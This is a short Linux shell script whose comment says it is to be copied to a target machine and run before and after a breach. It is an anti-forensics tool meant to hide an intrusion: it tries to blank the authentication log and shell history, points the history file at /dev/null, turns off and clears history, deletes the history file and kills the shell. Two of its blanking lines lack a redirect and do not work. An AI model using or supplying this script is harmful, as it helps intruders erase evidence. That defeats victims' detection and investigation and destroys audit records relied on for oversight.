# Copy to target Linux machine. Run before and after breach
echo "" /var/log/auth.log
echo "" ~/.bash_history
ln /dev/null ~/.bash_history -sf
history -c
export HISTFILESIZE=0
export HISTSIZE=0
unset HISTFILE
rm ~/.bash_history -rf
kill -9 $$
